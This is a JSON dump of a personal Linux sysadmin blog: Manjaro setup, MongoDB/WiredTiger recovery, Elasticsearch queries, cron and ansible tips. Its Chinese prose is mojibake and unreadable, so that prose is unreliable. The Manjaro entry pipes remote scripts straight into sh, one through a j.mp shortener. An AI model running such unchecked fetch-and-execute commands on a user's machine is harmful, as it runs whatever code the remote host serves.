startæœªå®Œå¾…ç»­å‚è€ƒ:1https://www.cnblogs.com/ralap7/p/9034879.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è­¦å‘Šï¼šæ— æ³•è§£å†³ â€œlibidn11â€³ï¼Œâ€fcitx-sogoupinyinâ€ çš„ä¸€ä¸ªä¾èµ–å…³ç³»","slug":"history/tech/5bcd57419a6b9e854693697a","date":"2018-10-22T04:51:13.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bcd57419a6b9e854693697a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bcd57419a6b9e854693697a/","excerpt":"","text":"ä¸‹è½½åº“å®‰è£…å³å¯ï¼Œåœ°å€å¦‚ä¸‹ï¼šhttps://www.archlinux.org/packages/community/x86_64/libidn11/å‚è€ƒèµ„æ–™:https://www.manjaro.cn/bbs/topic/manjaro-æ— æ³•æ»¡è¶³ä¾èµ–å…³ç³»-libidn11-è¢«fctix-sogoupinyin-æ‰€éœ€è¦","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"git ä»è¿œç¨‹ä»“åº“è·å–æ‰€æœ‰åˆ†æ”¯","slug":"history/tech/5bcd4e359a6b9e8546936979","date":"2018-10-22T04:12:37.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bcd4e359a6b9e8546936979/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bcd4e359a6b9e8546936979/","excerpt":"","text":"123git branch -r | grep -v &apos;\\-&gt;&apos; | while read remote; do git branch --track &quot;$&#123;remote#origin/&#125;&quot; &quot;$remote&quot;; donegit fetch --allgit pull --allhttp://stackoverflow.com/questions/10312521/how-to-fetch-all-git-branches","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"python å‘é€é‚®ä»¶ yagmail","slug":"history/tech/5bcd809b9a6b9e8546936980","date":"2018-10-21T19:47:39.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bcd809b9a6b9e8546936980/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bcd809b9a6b9e8546936980/","excerpt":"","text":"1sudo pip3 install yagmail","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"face_recognition å®‰è£…","slug":"history/tech/5bcd7bef9a6b9e854693697f","date":"2018-10-21T19:27:43.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bcd7bef9a6b9e854693697f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bcd7bef9a6b9e854693697f/","excerpt":"","text":"dlib ç¼–è¯‘å®‰è£…123git clone https://github.com/davisking/dlib.gitcd dlibpython setup.py install opencv-python å®‰è£…1sudo pip3 install opencv-pythonhttp://dlib.net/compile.html face_recognition å®‰è£…1pip3 install face_recognition","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å¸è½½ wine å®‰è£…çš„è½¯ä»¶","slug":"history/tech/5bcd5fb79a6b9e854693697e","date":"2018-10-21T17:27:19.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bcd5fb79a6b9e854693697e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bcd5fb79a6b9e854693697e/","excerpt":"","text":"1wine uninstaller","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"journalctl æ¸…ç†æ—¥å¿—","slug":"history/tech/5bcd5c2d9a6b9e854693697d","date":"2018-10-21T17:12:13.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bcd5c2d9a6b9e854693697d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bcd5c2d9a6b9e854693697d/","excerpt":"","text":"1journalctl --vacuum-size=500M","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"manjaro perf","slug":"history/tech/5bcd5bb29a6b9e854693697c","date":"2018-10-21T17:10:10.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bcd5bb29a6b9e854693697c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bcd5bb29a6b9e854693697c/","excerpt":"","text":"12sudo pacman -Syy perfperf top","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"manjaro sysstat","slug":"history/tech/5bcd5b249a6b9e854693697b","date":"2018-10-21T17:07:48.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bcd5b249a6b9e854693697b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bcd5b249a6b9e854693697b/","excerpt":"","text":"1234sudo pacman -Syy sysstatvim /etc/default/sysstatENABLED=&quot;true&quot;sudo service sysstat restart1sar -u 3 100","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ssh_exchange_identification Connection closed by remote host","slug":"history/tech/5bcc30c69a6b9e8546936978","date":"2018-10-20T19:54:46.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bcc30c69a6b9e8546936978/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bcc30c69a6b9e8546936978/","excerpt":"","text":"æŠ¥é”™:1ssh_exchange_identification: Connection closed by remote hostè§£å†³:123vim /etc/ssh/sshd_config#MaxStartups 10:30:100MaxStartups 15:30:10010ï¼š30ï¼š100è¡¨ç¤ºçš„æ„æ€æ˜¯ï¼Œä»ç¬¬10ä¸ªè¿æ¥å¼€å§‹ï¼Œä»¥30%çš„æ¦‚ç‡ï¼ˆé€’å¢ï¼‰æ‹’ç»æ–°çš„è¿æ¥ï¼Œç›´åˆ°è¿æ¥æ•°è¾¾åˆ°100","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"rm æ¢å¤è¯¯åˆ æ–‡ä»¶","slug":"history/tech/5bc0928f9a6b9e8546936977","date":"2018-10-12T00:24:47.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bc0928f9a6b9e8546936977/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bc0928f9a6b9e8546936977/","excerpt":"","text":"12sudo apt-get install extundeletesudo extundelete /dev/vdb1 --restore-all","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"elasticsearch ä¸‰ç§æ—¥æœŸæŸ¥è¯¢æ–¹å¼","slug":"history/tech/5bc091799a6b9e8546936976","date":"2018-10-12T00:20:09.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bc091799a6b9e8546936976/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bc091799a6b9e8546936976/","excerpt":"","text":"mapping:1234567891011121314151617181920&#123; &quot;mappings&quot;: &#123; &quot;xxx_profile&quot;: &#123; &quot;dynamic&quot;: &quot;false&quot;, &quot;_all&quot;: &#123; &quot;enabled&quot;: true &#125;, &quot;properties&quot;: &#123; &quot;xxx_time&quot;: &#123; &quot;type&quot;: &quot;date&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125; &#125; &#125; &#125; &#125; &#125;&#125; æŸ¥è¯¢æ–¹å¼ï¼‘:1234567891011121314151617181920212223&#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;must&quot;: [ &#123; &quot;range&quot;: &#123; &quot;xxx_time&quot;: &#123; &quot;gte&quot;: &quot;2018-09-16 00:00:00&quot;, &quot;lt&quot;: &quot;2018-09-17 00:00:00&quot;, &quot;format&quot;: &quot;yyyy-MM-dd HH:mm:ss&quot;, &quot;time_zone&quot;: &quot;+08:00&quot; &#125; &#125; &#125; ], &quot;must_not&quot;: [], &quot;should&quot;: [] &#125; &#125;, &quot;from&quot;: 0, &quot;size&quot;: 10, &quot;sort&quot;: []&#125; æŸ¥è¯¢æ–¹å¼ï¼’:123456789101112131415161718192021&#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;must&quot;: [ &#123; &quot;range&quot;: &#123; &quot;xxx_time.keyword&quot;: &#123; &quot;gte&quot;: &quot;2018-09-16&quot;, &quot;lt&quot;: &quot;2018-09-17&quot; &#125; &#125; &#125; ], &quot;must_not&quot;: [], &quot;should&quot;: [] &#125; &#125;, &quot;from&quot;: 0, &quot;size&quot;: 10, &quot;sort&quot;: []&#125; æŸ¥è¯¢æ–¹å¼ï¼“:1234567891011&#123; &quot;query&quot;: &#123; &quot;wildcard&quot;: &#123; &quot;xxx_time.keyword&quot;: &quot;*2018-09-16*&quot; &#125; &#125;, &quot;from&quot;: 0, &quot;size&quot;: 10, &quot;sort&quot;: []&#125; å¯¹åº” mongodb æŸ¥è¯¢æ–¹å¼:æ–¹å¼ï¼‘ï¼š123456&#123; &quot;xxx_time&quot;: &#123; $gte: &quot;2018-09-16 00:00:00&quot;, $lte: &quot;2018-09-16 20:00:00&quot; &#125;&#125;æ–¹å¼ï¼’:123&#123; &quot;xxx_time&quot;:/2018-09-16/&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mongodb è¯¯åˆ æŸä¸ªæ•°æ®åº“æ–‡ä»¶å¤¹,ã€€å¯¼è‡´æ•°æ®åº“æ— æ³•å¯åŠ¨å¤„ç†","slug":"history/tech/5bc0753f9a6b9e8546936975","date":"2018-10-11T22:19:43.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bc0753f9a6b9e8546936975/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bc0753f9a6b9e8546936975/","excerpt":"","text":"å®‰è£…å¿…è¦çš„åº“12apt install libsnappy-devapt install zlib1g-dev å®‰è£… wiredtiger å·¥å…·åŒ…123./configure --enable-snappy --enable-zlib --prefix=/usr/local/wiredtigermake -j8make install æŸ¥çœ‹åº“å1wt -v -h /data/mongodb/db/ -C &quot;extensions=[/usr/local/wiredtiger/lib/libwiredtiger_snappy.so, /usr/local/wiredtiger/lib/libwiredtiger_zlib.so]&quot; list dump å‡ºæŸä¸ª collection çš„æ•°æ®1wt -v -h /data/mongodb/db/ -C &quot;extensions=[/usr/local/wiredtiger/lib/libwiredtiger_snappy.so, /usr/local/wiredtiger/lib/libwiredtiger_zlib.so]&quot; -R dump -f test.dump test/collection/304--4723424148269970486 å¯¼å…¥å¦å¤–ä¸€ä¸ªå®ä¾‹åœ¨å¦å¤–ä¸€ä¸ªå¯å¯åŠ¨çš„å®ä¾‹ foo ä¸­åˆ›å»ºæ•°æ®åº“å’Œé›†åˆï¼Œè¿™ä¸ªé›†åˆä¸ºä¸´æ—¶é›†åˆï¼Œä½œä¸ºå¯¼å…¥å¯¼å‡ºæ•°æ®ä½¿ç”¨123456root@test:~# tree /data/mongodb-27017//data/mongodb-27017/â””â”€â”€ db â”œâ”€â”€ test â”‚ â”œâ”€â”€ collection â”‚ â”‚ â””â”€â”€ 0--7048601165654010388.wtå¯¼å‡ºå…ƒæ•°æ®ï¼Œå¹¶å¯¼å…¥åˆ° foo ä¸­ï¼Œè·å– ç‰©ç†æ–‡ä»¶å’Œ collection çš„å¯¹åº”å…³ç³»1234567wt -v -h /data/mongodb/db/ \\ -C &quot;extensions=[/usr/local/wiredtiger/lib/libwiredtiger_snappy.so, /usr/local/wiredtiger/lib/libwiredtiger_zlib.so]&quot; \\ -R dump -f _mdb_catalog.dump table:_mdb_catalogwt -v -h /data/mongodb-27017/db/ \\ -C &quot;extensions=[/usr/local/wiredtiger/lib/libwiredtiger_snappy.so, /usr/local/wiredtiger/lib/libwiredtiger_zlib.so]&quot; \\ -R load -f ./_mdb_catalog.dump -r test/collection/7--7048601165654010388æ¸…ç†æ‰å…ƒæ•°æ®åï¼Œå°†è¦æ¢å¤çš„æ•°æ®æ•°æ®å¯¼å…¥123wt -v -h /data/mongodb-27017/db/ \\ -C &quot;extensions=[/usr/local/wiredtiger/lib/libwiredtiger_snappy.so, /usr/local/wiredtiger/lib/libwiredtiger_zlib.so]&quot; \\ -R load -f ./1.dump -r test/collection/0--7048601165654010388éœ€è¦å°†è¦æ¢å¤çš„æ•°æ®å¯¼å…¥å†å¯¼å‡ºï¼Œé›†åˆä¿¡æ¯æ‰èƒ½æ˜¾ç¤ºæ­£å¸¸1/usr/local/mongodb/3.6/bin/mongodump --archive --db test | /usr/local/mongodb/3.6/bin/mongorestore --archive --nsFrom &quot;test.*&quot; --nsTo &quot;test_reimport.*&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu å®‰è£… zlib","slug":"history/tech/5bc044f59a6b9e8546936974","date":"2018-10-11T18:53:41.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bc044f59a6b9e8546936974/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bc044f59a6b9e8546936974/","excerpt":"","text":"1apt install zlib1g-dev","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"linux ä½¿ç”¨ pigz å¤šçº¿ç¨‹å‹ç¼©","slug":"history/tech/5bbf09289a6b9e8546936973","date":"2018-10-10T20:26:16.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bbf09289a6b9e8546936973/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bbf09289a6b9e8546936973/","excerpt":"","text":"12apt install -y pigztar cvf - $&#123; compress_dir &#125;/* | pigz -9 &gt; $&#123; compressedname &#125;.tar.gz","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"crontab ç­‰å¾…ä¸Šä¸€æ¬¡ç»“æŸå†æ‰§è¡Œä¸‹ä¸€æ¬¡çš„ä»»åŠ¡","slug":"history/tech/5bbf08c19a6b9e8546936972","date":"2018-10-10T20:24:33.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bbf08c19a6b9e8546936972/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bbf08c19a6b9e8546936972/","excerpt":"","text":"12# m h dom mon dow command* * * * * flock -xn /tmp/dump.lock -c &quot;/bin/bash /root/.sh/mongodump.sh&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu æ²¡æœ‰ã€€passwd --stdin","slug":"history/tech/5bbdac259a6b9e8546936971","date":"2018-10-09T19:37:09.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5bbdac259a6b9e8546936971/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5bbdac259a6b9e8546936971/","excerpt":"","text":"ubuntu æ²¡æœ‰ passwd --stdinè§£å†³:1ansible all -m shell -a &quot;echo &apos;username:password&apos;| chpasswd&quot;password ä¸­æœ‰ç¬¦å·è§£å†³:ansible all -m shell -a &quot;echo 'username:pass\\$word'| chpasswd&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"systemctl åˆ—è¡¨","slug":"history/tech/5ba4cd6cae2eaa9c4e941ab4","date":"2018-09-20T22:52:28.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5ba4cd6cae2eaa9c4e941ab4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ba4cd6cae2eaa9c4e941ab4/","excerpt":"","text":"1234systemctl list-unit-files | grep enabledsystemctl list-unit-files --state=enabledsystemctl list-units --type=service --state=runningsystemctl list-units --type=service --state=active","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"manjarno  æŠ˜è…¾è®°å½•","slug":"history/tech/5ba48a80ae2eaa9c4e941ab3","date":"2018-09-20T18:06:56.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5ba48a80ae2eaa9c4e941ab3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ba48a80ae2eaa9c4e941ab3/","excerpt":"","text":"åˆ‡æ¢ä¸­å›½é•œåƒæº1pacman-mirrors --country China æ·»åŠ archlinuxCNæº1234vim /etc/pacman.conf[archlinuxcn]SigLevel = Optional TrustedOnlyServer =https://mirrors.ustc.edu.cn/archlinuxcn/$arch æ›´æ–°ç³»ç»Ÿ1sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring å®‰è£… git1sudo pacman -S git å®‰è£… terminator1sudo pacman -S terminator å®‰è£… vim1sudo pacman -S vim å®‰è£…spf13-vimé…ç½®1curl https://j.mp/spf13-vim3 -L &gt; spf13-vim.sh &amp;&amp; sh spf13-vim.sh å®‰è£… vim-youcompleteme-git1sudo pacman -S vim-youcompleteme-git å®‰è£… gimp1sudo pacman -S gimp å®‰è£… oh-my-zsh1sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot; å®‰è£… autojump123456sudo pacman -S autojumpvim ~/.zshrcplugins=( git autojump) å®‰è£…æœç‹—æ‹¼éŸ³è¾“å…¥æ³•å®‰è£…1234sudo pacman -S fcitxsudo pacman -S fcitx-imsudo pacman -S fcitx-sogoupinyinsudo pacman -S fcitx-configtoolé…ç½®ï¼š12345vim ~/.xprofileexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=&quot;@im=fcitx&quot; ä¿®æ”¹ç›®å½•ä¸ºè‹±æ–‡12345678910vim ï½/.config/user-dirs.dirsXDG_DESKTOP_DIR=&quot;$HOME/Desktop&quot;XDG_DOWNLOAD_DIR=&quot;$HOME/Downloads&quot;XDG_TEMPLATES_DIR=&quot;$HOME/Templates&quot;XDG_PUBLICSHARE_DIR=&quot;$HOME/Public&quot;XDG_DOCUMENTS_DIR=&quot;$HOME/Documents&quot;XDG_MUSIC_DIR=&quot;$HOME/Music&quot;XDG_PICTURES_DIR=&quot;$HOME/Pictures&quot;XDG_VIDEOS_DIR=&quot;$HOME/Videos&quot; å®‰è£… amule1sudo pacman -S amule å®‰è£… virtualbox1sudo pacman -S virtualboxè¿™é‡Œéœ€è¦é€‰æ‹©ä¸å½“å‰å†…æ ¸ç›¸åŒçš„å†…æ ¸æ¨¡å—æ¯”å¦‚ç¬”è€…æ­£åœ¨ä½¿ç”¨çš„å†…æ ¸ç‰ˆæœ¬ä¸º414(uname -r)ï¼Œåˆ™éœ€è¦å®‰è£…linux414-virtualbox-host-modules1sudo modprobe vboxdrv å®‰è£…ä¸»é¢˜themes:https://www.gnome-look.org/icons:https://github.com/keeferrourke/la-capitaine-icon-theme.git123âœ ~ ls ~/.icons la-capitaine-icon-themeâœ ~ å®‰è£… aria2å®‰è£…1sudo pacman -S aria2é…ç½®å¼€æœºå¯åŠ¨12345678910gedit /usr/lib/systemd/system/aria2c.service[Unit]Description=aria2cAfter=network.target remote-fs.target nss-lookup.target[Service]Type=forkingExecStart=/usr/bin/aria2c --conf-path=/home/wangxiuwen/.aria2/aria2.conf[Install]WantedBy=multi-user.targetå¯åŠ¨123systemctl enable aria2c.servicesystemctl start aria2c.servicesystemctl status aria2c.serviceå®‰è£…ç•Œé¢123git clone https://github.com/mayswind/AriaNg.gitnpm installgulp clean builddist æ–‡ä»¶å¤¹å³ aria2c webç•Œé¢ openrestyç¼–è¯‘å®‰è£…ç•¥é…ç½®12345678910111213âœ ~ cat /usr/lib/systemd/system/nginx.service[Unit]Description=nginx - high performance web serverAfter=network.target remote-fs.target nss-lookup.target[Service]Type=forkingExecStart=/usr/local/openresty/nginx/sbin/nginx -c /usr/local/openresty/nginx/conf/nginx.confExecReload=/usr/local/openresty/nginx/sbin/nginx -s reloadExecStop=/usr/local/openresty/nginx/sbin/nginx -s stop[Install]WantedBy=multi-user.target å®‰è£… vmwarehttps://wiki.archlinux.org/index.php/VMware_(ç®€ä½“ä¸­æ–‡) å®‰è£… å¾®ä¿¡1sudo pacman -S electronic-wechat å®‰è£…ç½‘æ˜“äº‘éŸ³ä¹1sudo pacman -S netease-cloud-music å®‰è£… vlc1sudo pacman -S vlc å®‰è£… chrome1sudo pacman -S google-chrome è“ç‰™æŠ¥é”™æŠ¥é”™æˆªå›¾è§£å†³12gsettings get org.blueman.transfer shared-pathgsettings set org.blueman.transfer shared-path &apos;/home/wangxiuwen/Downloads&apos; å®‰è£… snap12sudo pacman -Sy snapdsudo systemctl enable --now snapd.socket å®‰è£…è¿…é›·12yaourt -Sy deepin.com.thunderspeedls $HOME/.deepinwine/Deepin-ThunderSpeed/drive_c/ å‚è€ƒèµ„æ–™https://blog.csdn.net/aosan002/article/details/79432759https://blog.csdn.net/weixin_41301508/article/details/81193217https://www.jianshu.com/p/f2c9ee00698chttps://docs.snapcraft.io/core/install-manjaro","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"multitail å¤šä¸ªæ–‡ä»¶","slug":"history/tech/5ba1ce8dae2eaa9c4e941ab2","date":"2018-09-19T04:20:29.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5ba1ce8dae2eaa9c4e941ab2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ba1ce8dae2eaa9c4e941ab2/","excerpt":"","text":"tail åªèƒ½ tail ä¸€ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨ multitail å¯ä»¥åŒæ—¶æŸ¥çœ‹å¤šä¸ªæ–‡ä»¶12apt install multitailmultitail -i 1.log -i 2.log","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"python æŠ¥é”™ AttributeError  'module' object has no attribute 'SSL_ST_INIT'","slug":"history/tech/5ba1cd63ae2eaa9c4e941ab1","date":"2018-09-19T04:15:31.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5ba1cd63ae2eaa9c4e941ab1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ba1cd63ae2eaa9c4e941ab1/","excerpt":"","text":"æŠ¥é”™ï¼š12345678910111213141516171819root@xxx:~# pipTraceback (most recent call last): File &quot;/usr/local/bin/pip&quot;, line 7, in &lt;module&gt; from pip._internal import main File &quot;/usr/local/lib/python2.7/dist-packages/pip/_internal/__init__.py&quot;, line 42, in &lt;module&gt; from pip._internal import cmdoptions File &quot;/usr/local/lib/python2.7/dist-packages/pip/_internal/cmdoptions.py&quot;, line 16, in &lt;module&gt; from pip._internal.index import ( File &quot;/usr/local/lib/python2.7/dist-packages/pip/_internal/index.py&quot;, line 15, in &lt;module&gt; from pip._vendor import html5lib, requests, six File &quot;/usr/local/lib/python2.7/dist-packages/pip/_vendor/requests/__init__.py&quot;, line 86, in &lt;module&gt; from pip._vendor.urllib3.contrib import pyopenssl File &quot;/usr/local/lib/python2.7/dist-packages/pip/_vendor/urllib3/contrib/pyopenssl.py&quot;, line 46, in &lt;module&gt; import OpenSSL.SSL File 